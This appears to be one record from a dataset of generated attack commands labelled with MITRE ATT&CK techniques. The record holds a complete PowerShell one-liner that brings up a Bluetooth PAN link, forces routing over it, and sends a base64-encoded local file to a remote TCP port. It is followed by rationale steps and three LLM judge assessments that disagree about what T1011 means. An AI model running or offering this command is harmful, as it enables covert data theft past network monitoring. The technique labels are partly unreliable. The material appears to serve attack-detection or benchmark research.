command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name="$($ad.Name)" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\ProgramData\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()
explanation: Pins a host route to the Bluetooth interface to prevent crossover, then exfiltrates base64 data over a custom TCP port via the Bluetooth PAN (T1011).
rationale_steps: Connect Bluetooth NAP to use a different medium.
Set a static address on the Bluetooth adapter using netsh.
Add a host route bound to the Bluetooth interface index to force path selection.
Bind TCP socket to the Bluetooth IP and transmit base64 payload to a high port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, pipeline operations, and object method calls.
llm_judgments.semantic_justification: The command aligns well with T1011 by establishing a Bluetooth connection and exfiltrating binary data over that channel, though it focuses more on data exfiltration rather than firmware modification which is the core of T1011.

llm_judgments.syntactic_justification: The Powershell command is perfectly well-formed, using correct cmdlet syntax, external command calls, .NET method invocations, variable expansions, and proper command separators.
llm_judgments.semantic_justification: The command performs network configuration and data exfiltration, which is entirely unrelated to 'Modify System Image' (T1011) as described by MITRE ATT&CK.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced quotes and separators, valid variable expansion and .NET method usage, and correctly structured external command invocations.
llm_judgments.semantic_justification: It plausibly aims to exfiltrate data over a Bluetooth PAN by connecting, configuring the interface, and sending TCP-bound data, but the static IP/route steps typically require admin rights and the specified host route uses the local IP as gateway, making reliable execution and the claimed effect unlikely as-is.
